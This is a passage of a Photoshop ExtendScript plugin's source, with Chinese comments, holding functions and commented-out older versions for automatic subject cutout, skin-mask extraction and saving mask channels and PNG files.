      app.executeAction(sTID(val > 0 ? 'expand' : 'contract'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  autoCutout: function (maskName) { //选取主体
    if (!this.loadSelection(maskName || '$XT|Temp|maskMain')) {
      try {
        this.deSelection();
        var desc1 = new ActionDescriptor();
        desc1.putBoolean(sTID("sampleAllLayers"), false);
        app.executeAction(sTID('autoCutout'), desc1, DialogModes.NO);
        this.editSelect(2);
        this.smoothSelect(2);
        this.setSelFeather(2);
      } catch (e) { this.makeAllSelect() }
      this.saveSelection(maskName || '$XT|Temp|maskMain');
    }
    return !0
  },
  // autoSkin_bak: function(Area,funName) { //选取皮肤
  //   if (!this.loadSelection('$XT|Temp|mask'+Area)) {
  //     var doc = app.activeDocument;
  //     try {
  //       var maskFile = this.getAreaFile(Area);
  //       if(File(maskFile).exists){
  //         //通过蒙板文件获取蒙板
  //         var desc1 = new ActionDescriptor();
  //         desc1.putPath(cTID('null'), new File(maskFile));
  //         desc1.putBoolean(cTID('Lnkd'), true);
  //         desc1.putEnumerated(cTID('FTcs'), cTID('QCSt'), sTID("QCSAverage"));
  //         var desc2 = new ActionDescriptor();
  //         desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), 0);
  //         desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), 0);
  //         desc1.putObject(cTID('Ofst'), cTID('Ofst'), desc2);
  //         app.executeAction(sTID('placeEvent'), desc1, DialogModes.NO);
  //         this.rasterizeLayer();
  //         this.fullTransform();
  //         this.makeAllSelect();
  //         var desc1 = new ActionDescriptor();
  //         desc1.putUnitDouble(cTID('By  '), cTID('#Pxl'), 5);
  //         desc1.putBoolean(sTID("selectionModifyEffectAtCanvasBounds"), true);
  //         app.executeAction(sTID('contract'), desc1, DialogModes.NO);
  //         app.executeAction(sTID('inverse'), undefined, DialogModes.NO);
  //         var desc1 = new ActionDescriptor();
  //         desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Blck'));
  //         desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
  //         app.executeAction(sTID('fill'), desc1, DialogModes.NO);
  //         var desc1 = new ActionDescriptor();
  //         var ref1 = new ActionReference();
  //         ref1.putProperty(cTID('Chnl'), sTID("selection"));
  //         desc1.putReference(cTID('null'), ref1);
  //         var ref2 = new ActionReference();
  //         ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
  //         desc1.putReference(cTID('T   '), ref2);
  //         app.executeAction(sTID('set'), desc1, DialogModes.NO);
  //         this.deleteLayer();
  //         this.saveSelection('$XT|Temp|mask'+Area);
  //         // //通过色块文件获取蒙板
  //         // var desc1 = new ActionDescriptor();
  //         // desc1.putPath(cTID('null'), File(maskFile));
  //         // desc1.putBoolean(sTID("smartObject"), false);
  //         // app.executeAction(sTID('open'), desc1, DialogModes.NO);
  //         // _getSkinMask=function(){
  //         //   if($._Kaibei.selColorRange([0,0,255])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([85,51,0])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([0,255,255])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([51,170,221])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([170,255,85])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([85,255,170])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([255,255,255])){app.executeAction(sTID('inverse'), undefined, DialogModes.NO);$._Kaibei.fillLayer([0,0]);$._Kaibei.deSelection()}
  //         //   var desc1 = new ActionDescriptor();
  //         //   var ref1 = new ActionReference();
  //         //   ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
  //         //   desc1.putReference(cTID('null'), ref1);
  //         //   var ref2 = new ActionReference();
  //         //   ref2.putName(cTID('Dcmn'), doc.name);
  //         //   desc1.putReference(cTID('T   '), ref2);
  //         //   desc1.putInteger(sTID("destinationDocumentID"), doc.id);
  //         //   desc1.putString(cTID('Nm  '), "$XT_Thumbnail");
  //         //   app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
  //         //   $._Kaibei.closeDoc();
  //         // }
  //         // app.activeDocument.suspendHistory('$XT_Thumbnail','_getSkinMask()');
  //         // this.fullTransform();
  //         // var desc1 = new ActionDescriptor();
  //         // var ref1 = new ActionReference();
  //         // ref1.putProperty(cTID('Chnl'), sTID("selection"));
  //         // desc1.putReference(cTID('null'), ref1);
  //         // var ref2 = new ActionReference();
  //         // ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
  //         // desc1.putReference(cTID('T   '), ref2);
  //         // app.executeAction(sTID('set'), desc1, DialogModes.NO);
  //         // this.deleteLayer();
  //         // this.saveSelection('$XT|Temp|maskSkin');
  //       }else{
  //         $._Kaibei.showProgress('AI分析照片');
  //         var docSize = this.getDocSize();
  //         var desc1 = new ActionDescriptor();
  //         var ref1 = new ActionReference();
  //         ref1.putEnumerated(cTID('Dcmn'), cTID('Ordn'), cTID('Frst'));
  //         desc1.putReference(cTID('null'), ref1);
  //         desc1.putString(cTID('Nm  '), '$XT_Thumbnail');
  //         desc1.putBoolean(cTID('Mrgd'), true);
  //         app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
  //         _getSkinMaskByPlug = function(){
  //           var tempDoc = app.activeDocument;
  //           tempDoc.flatten();
  //           var tempDocSize = $._Kaibei.getDocSize();
  //           if(tempDocSize.height > tempDocSize.width) tempDoc.resizeImage(null, UnitValue(Math.min(1200, tempDocSize.height), "px"), null, ResampleMethod.AUTOMATIC);
  //           else tempDoc.resizeImage(UnitValue(Math.min(1200, tempDocSize.width), "px"), null, null, ResampleMethod.AUTOMATIC);
  //           tempDoc.activeLayer.name = "$XT_Thumbnail";
  //           // if(File(maskFile).exists){
  //           //   var desc1 = new ActionDescriptor();
  //           //   desc1.putPath(cTID('null'), new File(maskFile));
  //           //   desc1.putBoolean(cTID('Lnkd'), true);
  //           //   desc1.putEnumerated(cTID('FTcs'), cTID('QCSt'), sTID("QCSAverage"));
  //           //   var desc2 = new ActionDescriptor();
  //           //   desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), 0);
  //           //   desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), 0);
  //           //   desc1.putObject(cTID('Ofst'), cTID('Ofst'), desc2);
  //           //   app.executeAction(sTID('placeEvent'), desc1, DialogModes.NO);
  //           //   $._Kaibei.fullTransform();
  //           //   var desc1 = new ActionDescriptor();
  //           //   var ref1 = new ActionReference();
  //           //   ref1.putProperty(cTID('Chnl'), sTID("selection"));
  //           //   desc1.putReference(cTID('null'), ref1);
  //           //   var ref2 = new ActionReference();
  //           //   ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
  //           //   desc1.putReference(cTID('T   '), ref2);
  //           //   app.executeAction(sTID('set'), desc1, DialogModes.NO);
  //           //   $._Kaibei.deleteLayer();
  //           //   $._Kaibei.makeMask(1);
  //           // }else 
  //           $._Kaibei.duplicateLayer();
  //           app.executeAction(sTID('removeBackground'), undefined, DialogModes.NO);
  //           $._Kaibei.saveMask('$XT_Thumbnail');
  //           $._Kaibei.applyMask();
  //           // if(Area=='Main'){ //通过抠图取主体蒙板
  //             var desc1 = new ActionDescriptor();
  //             desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Wht '));
  //             desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
  //             desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
  //             desc1.putBoolean(cTID('PrsT'), true);
  //             app.executeAction(sTID('fill'), desc1, DialogModes.NO);
  //             var desc1 = new ActionDescriptor();
  //             desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Blck'));
  //             desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
  //             desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Bhnd'));
  //             app.executeAction(sTID('fill'), desc1, DialogModes.NO);
  //             // $._Kaibei.savePng(File(maskFile));
  //             $._Kaibei.savePng(File(File(maskFile).parent + '/maskMain.png'));
  //             $._Kaibei.deleteLayer();
  //           // }else{ //通过插件获取皮肤蒙板
  //             $._Kaibei.setLayerOpacity(0);
  //             var desc1 = new ActionDescriptor();
  //             desc1.putInteger(cTID('IsHB'), 0);
  //             desc1.putDouble(cTID('SenF'), 100);
  //             app.executeAction(sTID('97a43df8-7f6c-4435-a984-81c8f727d2aa'), desc1, DialogModes.NO);
  //             $._Kaibei.makeLayerTrsp();
  //             $._Kaibei.loadSelectionCross('$XT_Thumbnail');
  //             $._Kaibei.makeMask(1);
  //             $._Kaibei.applyMask();
  //             var desc1 = new ActionDescriptor();
  //             desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Wht '));
  //             desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
  //             desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
  //             desc1.putBoolean(cTID('PrsT'), true);
  //             app.executeAction(sTID('fill'), desc1, DialogModes.NO);
  //             var desc1 = new ActionDescriptor();
  //             desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Blck'));
  //             desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
  //             desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Bhnd'));
  //             app.executeAction(sTID('fill'), desc1, DialogModes.NO);
  //             $._Kaibei.setLayerOpacity(100);
  //             // $._Kaibei.savePng(File(maskFile));
  //             $._Kaibei.savePng(File(File(maskFile).parent + '/maskSkin.png'));
  //           // }
  //           // if(tempDocSize.height > tempDocSize.width) tempDoc.resizeImage(null, UnitValue(docSize.height, "px"), null, ResampleMethod.NEARESTNEIGHBOR);
  //           // else tempDoc.resizeImage(UnitValue(docSize.width, "px"), null, null, ResampleMethod.NEARESTNEIGHBOR);
  //           // $._Kaibei.copyLayerToDoc(doc);
  //           $._Kaibei.closeDoc();
  //         }
  //         app.activeDocument.suspendHistory('$XT_Thumbnail','_getSkinMaskByPlug()');
  //         $._Kaibei.showProgress(funName.split("|")[1]);
  //         return this.autoSkin(Area);
  //       }
  //       return !0;
  //     }catch(e){
  //       // alert(e+e.line);
  //       if(app.activeDocument.id!=doc.id)$._Kaibei.closeDoc();
  //       return !1
  //     }
  //   }
  //   return !0
  // },
  // autoSkin_bak5: function(Area,funName,isOnce) { //选取皮肤
  //   //isOnce:临时生成蒙板文件后只执行一次，防止死循环
  //   if (!this.loadSelection('$XT|Temp|mask'+Area)) {
  //     var doc = app.activeDocument;
  //     if(doc.mode !== DocumentMode.RGB)this.convertMode("RGBColorMode");
  //     try {
  //       var maskFile = File(this.getAreaFile(Area));
  //       if(maskFile.exists){
  //         var docSize = this.getDocSize();
  //         //通过蒙板文件获取蒙板
  //         var desc1 = new ActionDescriptor();
  //         desc1.putPath(cTID('null'), maskFile);
  //         desc1.putBoolean(cTID('Lnkd'), true);
  //         desc1.putEnumerated(cTID('FTcs'), cTID('QCSt'), sTID("QCSAverage"));
  //         var desc2 = new ActionDescriptor();
  //         desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), 0);
  //         desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), 0);
  //         desc1.putObject(cTID('Ofst'), cTID('Ofst'), desc2);
  //         app.executeAction(sTID('placeEvent'), desc1, DialogModes.NO);
  //         var mBounds = this.boundsToInt(this.getLayerBounds());
  //         if(isOnce || Math.abs(docSize.width/docSize.height - (mBounds[2]-mBounds[0])/(mBounds[3]-mBounds[1])) < 0.1){
  //           this.fullTransform();
  //           this.fullTransform();
  //           this.rasterizeLayer();
  //           this.makeRectSelect([0,0,1,1]);
  //           this.fillLayer([0,80]);
  //           // this.makeAllSelect();
  //           // var desc1 = new ActionDescriptor();
  //           // desc1.putUnitDouble(cTID('By  '), cTID('#Pxl'), 15);
  //           // desc1.putBoolean(sTID("selectionModifyEffectAtCanvasBounds"), true);
  //           // app.executeAction(sTID('contract'), desc1, DialogModes.NO);
  //           // app.executeAction(sTID('inverse'), undefined, DialogModes.NO);
  //           // var desc1 = new ActionDescriptor();
  //           // desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Blck'));
  //           // desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
  //           // app.executeAction(sTID('fill'), desc1, DialogModes.NO);
  //           var desc1 = new ActionDescriptor();
  //           var ref1 = new ActionReference();
  //           ref1.putProperty(cTID('Chnl'), sTID("selection"));
  //           desc1.putReference(cTID('null'), ref1);
  //           var ref2 = new ActionReference();
  //           ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
  //           desc1.putReference(cTID('T   '), ref2);
  //           app.executeAction(sTID('set'), desc1, DialogModes.NO);
  //           this.deleteLayer();
  //           if(!this.getSelectionBounds() && Area!='Limb')this.makeAllSelect();//全黑蒙板时保存白色通道
  //           this.saveSelection('$XT|Temp|mask'+Area);
  //         }else if(Area=='Main' || Area=='Skin'){
  //           this.deleteLayer();
  //           maskFile.remove();
  //           return this.autoSkin(Area,funName);
  //         }else this.deleteLayer();
  //         // //通过色块文件获取蒙板
  //         // var desc1 = new ActionDescriptor();
  //         // desc1.putPath(cTID('null'), maskFile);
  //         // desc1.putBoolean(sTID("smartObject"), false);
  //         // app.executeAction(sTID('open'), desc1, DialogModes.NO);
  //         // _getSkinMask=function(){
  //         //   if($._Kaibei.selColorRange([0,0,255])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([85,51,0])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([0,255,255])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([51,170,221])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([170,255,85])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([85,255,170])){$._Kaibei.fillLayer([0,100]);$._Kaibei.deSelection()}
  //         //   if($._Kaibei.selColorRange([255,255,255])){app.executeAction(sTID('inverse'), undefined, DialogModes.NO);$._Kaibei.fillLayer([0,0]);$._Kaibei.deSelection()}
  //         //   var desc1 = new ActionDescriptor();
  //         //   var ref1 = new ActionReference();
  //         //   ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
  //         //   desc1.putReference(cTID('null'), ref1);
  //         //   var ref2 = new ActionReference();
  //         //   ref2.putName(cTID('Dcmn'), doc.name);
  //         //   desc1.putReference(cTID('T   '), ref2);
  //         //   desc1.putInteger(sTID("destinationDocumentID"), doc.id);
  //         //   desc1.putString(cTID('Nm  '), "$XT_Thumbnail");
  //         //   app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
  //         //   $._Kaibei.closeDoc();
  //         // }
  //         // app.activeDocument.suspendHistory('$XT_Thumbnail','_getSkinMask()');
  //         // this.fullTransform();
  //         // var desc1 = new ActionDescriptor();
  //         // var ref1 = new ActionReference();
  //         // ref1.putProperty(cTID('Chnl'), sTID("selection"));
  //         // desc1.putReference(cTID('null'), ref1);
  //         // var ref2 = new ActionReference();
  //         // ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
  //         // desc1.putReference(cTID('T   '), ref2);
  //         // app.executeAction(sTID('set'), desc1, DialogModes.NO);
  //         // this.deleteLayer();
  //         // this.saveSelection('$XT|Temp|maskSkin');
  //       }else if(Area=='Main' || Area=='Skin'){
  //         $._Kaibei.showProgress('提取照片特征');
  //         var desc1 = new ActionDescriptor();
  //         var ref1 = new ActionReference();
  //         ref1.putEnumerated(cTID('Dcmn'), cTID('Ordn'), cTID('Frst'));
  //         desc1.putReference(cTID('null'), ref1);
  //         desc1.putString(cTID('Nm  '), '$XT_Thumbnail');
  //         desc1.putBoolean(cTID('Mrgd'), true);
  //         app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
  //         _getSkinMaskByPlug = function(){
  //           var tempDoc = app.activeDocument;
  //           tempDoc.flatten();
  //           var tempDocSize = $._Kaibei.getDocSize();
  //           tempDoc.activeLayer.name = "$XT_Thumbnail";
  //           $._Kaibei.duplicateLayer();
  //           // if(maskFile.exists){
  //           //   var desc1 = new ActionDescriptor();
  //           //   desc1.putPath(cTID('null'), new File(maskFile));
  //           //   desc1.putBoolean(cTID('Lnkd'), true);
  //           //   desc1.putEnumerated(cTID('FTcs'), cTID('QCSt'), sTID("QCSAverage"));
  //           //   var desc2 = new ActionDescriptor();
  //           //   desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), 0);
  //           //   desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), 0);
  //           //   desc1.putObject(cTID('Ofst'), cTID('Ofst'), desc2);
  //           //   app.executeAction(sTID('placeEvent'), desc1, DialogModes.NO);
  //           //   $._Kaibei.fullTransform();
  //           //   var desc1 = new ActionDescriptor();
  //           //   var ref1 = new ActionReference();
  //           //   ref1.putProperty(cTID('Chnl'), sTID("selection"));
  //           //   desc1.putReference(cTID('null'), ref1);
  //           //   var ref2 = new ActionReference();
  //           //   ref2.putEnumerated(cTID('Chnl'), cTID('Chnl'), sTID("RGB"));
  //           //   desc1.putReference(cTID('T   '), ref2);
  //           //   app.executeAction(sTID('set'), desc1, DialogModes.NO);
  //           //   $._Kaibei.deleteLayer();
  //           //   $._Kaibei.makeMask(1);
  //           // }else 
  //           // app.executeAction(sTID('removeBackground'), undefined, DialogModes.NO);
  //           try{//处理没有主体的情况
  //             var desc1 = new ActionDescriptor();
  //             desc1.putBoolean(sTID("sampleAllLayers"), false);
  //             app.executeAction(sTID('autoCutout'), desc1, DialogModes.NO);
  //             $._Kaibei.saveSelection('$XT|Temp|maskMain');
  //             $._Kaibei.makeMask(1);
  //             $._Kaibei.applyMask();
  //           }catch(e){}
  //           var desc1 = new ActionDescriptor();
  //           desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Wht '));
  //           desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
  //           desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
  //           desc1.putBoolean(cTID('PrsT'), true);
  //           app.executeAction(sTID('fill'), desc1, DialogModes.NO);
  //           var desc1 = new ActionDescriptor();
  //           desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Blck'));
  //           desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
  //           desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Bhnd'));
  //           app.executeAction(sTID('fill'), desc1, DialogModes.NO);
  //           // $._Kaibei.savePng(maskFile);
  //           $._Kaibei.savePng(File(maskFile.parent + '/maskMain.png'));
  //           $._Kaibei.deleteLayer();
  //           $._Kaibei.showProgress('深度分析皮肤');
  //           // if(Area=='Skin'){ //通过插件获取皮肤蒙板
  //             $._Kaibei.setLayerOpacity(0);
  //             $._Kaibei.loadSelection('$XT|Temp|maskMain');
  //             $._Kaibei.editSelect(2);
  //             //根据选区判断是否需要缩小画布
  //             var selBounds = $._Kaibei.getSelectionBounds();
  //             if(selBounds && (!$._Kaibei.userData.video_memory || $._Kaibei.userData.video_memory.length<1 || $._Kaibei.userData.video_memory[0]>=6)){//有主体
  //               var selRect = $._Kaibei.boundsToInt(selBounds);
  //               var selSize = {width:selRect[2]-selRect[0],height:selRect[3]-selRect[1]};
  //               var maxSize = 1200;
  //               if(selSize.width>maxSize || selSize.height>maxSize){
  //                 var selScale = maxSize/(selSize.width>selSize.height ? selSize.width : selSize.height);
  //                 tempDoc.resizeImage(UnitValue(selScale*tempDocSize.width, "px"), null, null, ResampleMethod.AUTOMATIC);
  //               }else if(selSize.width*selSize.height<2400 && $.os.indexOf("Windows")<0){//主体选区太小时，Mac版会崩溃
  //                 selBounds = !1;
  //                 if(tempDocSize.height > tempDocSize.width) tempDoc.resizeImage(null, UnitValue(Math.min(1200, tempDocSize.height), "px"), null, ResampleMethod.AUTOMATIC);
  //                 else tempDoc.resizeImage(UnitValue(Math.min(1200, tempDocSize.width), "px"), null, null, ResampleMethod.AUTOMATIC);
  //               }
  //               $._Kaibei.loadSelection('$XT|Temp|maskMain');
  //               $._Kaibei.editSelect(2);
  //               $._Kaibei.makeRectSelect($._Kaibei.boundsToInt($._Kaibei.getSelectionBounds()));
  //             }else{//没有主体
  //               if(tempDocSize.height > tempDocSize.width) tempDoc.resizeImage(null, UnitValue(Math.min(1200, tempDocSize.height), "px"), null, ResampleMethod.AUTOMATIC);
  //               else tempDoc.resizeImage(UnitValue(Math.min(1200, tempDocSize.width), "px"), null, null, ResampleMethod.AUTOMATIC);
  //               if(selBounds){
  //                 $._Kaibei.loadSelection('$XT|Temp|maskMain');
  //                 $._Kaibei.editSelect(2);
  //               }
  //             }
  //             var desc1 = new ActionDescriptor();
  //             desc1.putInteger(cTID('IsHB'), 0);
  //             desc1.putDouble(cTID('SenF'), 80);
  //             app.executeAction(sTID('97a43df8-7f6c-4435-a984-81c8f727d2aa'), desc1, DialogModes.NO);
  //             if(selBounds)$._Kaibei.editSelect(-1);
  //             var desc1 = new ActionDescriptor();
  //             desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Wht '));
  //             desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
  //             desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
  //             desc1.putBoolean(cTID('PrsT'), true);
  //             app.executeAction(sTID('fill'), desc1, DialogModes.NO);
  //             $._Kaibei.invSelection();
  //             $._Kaibei.delSelPixels();
  //             $._Kaibei.deSelection();
  //             var desc1 = new ActionDescriptor();
  //             desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Blck'));
  //             desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
  //             desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Bhnd'));
  //             app.executeAction(sTID('fill'), desc1, DialogModes.NO);
  //             $._Kaibei.setLayerOpacity(100);
  //             // $._Kaibei.savePng(File(maskFile));
  //             $._Kaibei.savePng(File(maskFile.parent + '/maskSkin.png'));
  //           // }
  //           // if(tempDocSize.height > tempDocSize.width) tempDoc.resizeImage(null, UnitValue(docSize.height, "px"), null, ResampleMethod.NEARESTNEIGHBOR);
  //           // else tempDoc.resizeImage(UnitValue(docSize.width, "px"), null, null, ResampleMethod.NEARESTNEIGHBOR);
  //           // $._Kaibei.copyLayerToDoc(doc);
  //           $._Kaibei.closeDoc();
  //         }
  //         // var timer = new Date();
  //         app.activeDocument.suspendHistory('$XT_Thumbnail','_getSkinMaskByPlug()');
  //         // alert(new Date()-timer);
  //         funName = funName||'|处理中';
  //         $._Kaibei.showProgress(funName.split("|")[1]);
  //         // if(!File(maskFile.parent + '/maskMain.png').exists || !File(maskFile.parent + '/maskSkin.png').exists){
  //         if(!File(maskFile.parent + '/mask' + Area + '.png').exists){
  //           if(Area=='Main')this.makeAllSelect();
  //           return !1;
  //         }else return this.autoSkin(Area,funName,!0);
  //       }
  //       return !0;
  //     }catch(e){
  //       // alert(e+e.line);
  //       if(app.activeDocument.id!=doc.id)$._Kaibei.closeDoc();
  //       return !1
  //     }
  //   }
  //   return !0
  // },
  autoSkin: function (Area, funName, isOnce) { //提取选区
    //isOnce:临时生成蒙板文件后只执行一次，防止死循环
    try {
      if (typeof Area == 'string' && this.loadSelection('$XT|Temp|mask' + Area)) return !0;
      var doc = app.activeDocument;
      //排除已经存在的通道
      if (typeof Area == 'object') {
        var channels = doc.channels;
        var listArea = [];
        for (var n = 0; n < Area.length; n++) {
          try { channels.getByName('$XT|Temp|mask' + Area[n]) } catch (e) { listArea.push(Area[n]) }
        }
        if (!listArea.length) return !0;
        Area = listArea;
      }
      if (doc.mode !== DocumentMode.RGB) this.convertMode("RGBColorMode");
      this.convertDepth(8);
      this.toSRGB();
      var maskFile = File(this.getAreaFile(Area));
      if (maskFile.exists) {
        var docSize = this.getDocSize();
        //通过蒙板文件获取蒙板
        var desc1 = new ActionDescriptor();
        desc1.putPath(cTID('null'), maskFile);
        desc1.putBoolean(cTID('Lnkd'), true);
        desc1.putEnumerated(cTID('FTcs'), cTID('QCSt'), sTID("QCSAverage"));
        var desc2 = new ActionDescriptor();
        desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), 0);
        desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), 0);
        desc1.putObject(cTID('Ofst'), cTID('Ofst'), desc2);
        app.executeAction(sTID('placeEvent'), desc1, DialogModes.NO);
        var mBounds = this.boundsToInt(this.getLayerBounds());
        if (isOnce || Math.abs(docSize.width / docSize.height - (mBounds[2] - mBounds[0]) / (mBounds[3] - mBounds[1])) < 0.1) {
          this.fullTransform();
          this.fullTransform();
          this.rasterizeLayer();
          this.makeRectSelect([0, 0, 1, 1]);
          this.fillLayer([0, 80]);
          this.makeChannelTrsp('RGB', !0);
          // this.makeChannelTrspRGB();
          this.deleteLayer();
          if (Area != 'Limb' && !this.getSelectionBounds()) this.makeAllSelect();//全黑蒙板时保存白色通道
          this.saveSelection('$XT|Temp|mask' + Area);
        } else if (Area == 'Main' || Area == 'Skin') {
          this.deleteLayer();
          maskFile.remove();
          return this.autoSkin(Area, funName);
        } else this.deleteLayer();
      } else if (Area == 'Main' || Area == 'Skin') {
        this.showProgress('提取照片特征');
        var desc1 = new ActionDescriptor();
        var ref1 = new ActionReference();
        ref1.putEnumerated(cTID('Dcmn'), cTID('Ordn'), cTID('Frst'));
        desc1.putReference(cTID('null'), ref1);
        desc1.putString(cTID('Nm  '), '$XT_Thumbnail');
        desc1.putBoolean(cTID('Mrgd'), true);
        app.executeAction(sTID('duplicate'), desc1, DialogModes.NO);
        _getSkinMaskByPlug = function () {
          var tempDoc = app.activeDocument;
          tempDoc.flatten();
          var tempDocSize = $._Kaibei.getDocSize();
          tempDoc.activeLayer.name = "$XT_Thumbnail";
          $._Kaibei.duplicateLayer();
          try {//处理没有主体的情况
            var desc1 = new ActionDescriptor();
            desc1.putBoolean(sTID("sampleAllLayers"), false);
            app.executeAction(sTID('autoCutout'), desc1, DialogModes.NO);
            $._Kaibei.saveSelection('$XT|Temp|maskMain');
            $._Kaibei.makeMask(1);
            $._Kaibei.applyMask();
          } catch (e) { }
          var desc1 = new ActionDescriptor();
          desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Wht '));
          desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
          desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
          desc1.putBoolean(cTID('PrsT'), true);
          app.executeAction(sTID('fill'), desc1, DialogModes.NO);
          var desc1 = new ActionDescriptor();
          desc1.putEnumerated(cTID('Usng'), cTID('FlCn'), cTID('Blck'));
          desc1.putUnitDouble(cTID('Opct'), cTID('#Prc'), 100);
          desc1.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Bhnd'));
          app.executeAction(sTID('fill'), desc1, DialogModes.NO);
          $._Kaibei.savePng(File(maskFile.parent + '/maskMain.png'));
          $._Kaibei.deleteLayer();
          $._Kaibei.showProgress('深度分析皮肤');
          if (Area == 'Skin') { //通过插件获取皮肤蒙板
            $._Kaibei.setLayerOpacity(0);
            $._Kaibei.loadSelection('$XT|Temp|maskMain');
            $._Kaibei.editSelect(2);
            //根据选区判断是否需要缩小画布
            var selBounds = $._Kaibei.getSelectionBounds();
            if (selBounds && (!$._Kaibei.userData.video_memory || $._Kaibei.userData.video_memory.length < 1 || $._Kaibei.userData.video_memory[0] >= 6)) {//有主体
              var selRect = $._Kaibei.boundsToInt(selBounds);
              var selSize = { width: selRect[2] - selRect[0], height: selRect[3] - selRect[1] };
              var maxSize = 1200;
              if (selSize.width > maxSize || selSize.height > maxSize) {
                var selScale = maxSize / (selSize.width > selSize.height ? selSize.width : selSize.height);
                tempDoc.resizeImage(UnitValue(selScale * tempDocSize.width, "px"), null, null, ResampleMethod.AUTOMATIC);
              } else if (selSize.width * selSize.height < 2400 && $.os.indexOf("Windows") < 0) {//主体选区太小时，Mac版会崩溃
                selBounds = !1;
                if (tempDocSize.height > tempDocSize.width) tempDoc.resizeImage(null, UnitValue(Math.min(1200, tempDocSize.height), "px"), null, ResampleMethod.AUTOMATIC);
                else tempDoc.resizeImage(UnitValue(Math.min(1200, tempDocSize.width), "px"), null, null, ResampleMethod.AUTOMATIC);
              }
              $._Kaibei.loadSelection('$XT|Temp|maskMain');
              $._Kaibei.editSelect(2);
              $._Kaibei.makeRectSelect($._Kaibei.boundsToInt($._Kaibei.getSelectionBounds()));
            } else {//没有主体
              if (tempDocSize.height > tempDocSize.width) tempDoc.resizeImage(null, UnitValue(Math.min(1200, tempDocSize.height), "px"), null, ResampleMethod.AUTOMATIC);
              else tempDoc.resizeImage(UnitValue(Math.min(1200, tempDocSize.width), "px"), null, null, ResampleMethod.AUTOMATIC);
              if (selBounds) {
                $._Kaibei.loadSelection('$XT|Temp|maskMain');
                $._Kaibei.editSelect(2);
              }
            }
            try {
              var desc1 = new ActionDescriptor();
              desc1.putInteger(cTID('IsHB'), 0);
              desc1.putDouble(cTID('SenF'), 80);
              app.executeAction(sTID('97a43df8-7f6c-4435-a984-81c8f727d2aa'), desc1, DialogModes.NO);
            } catch (e) { }
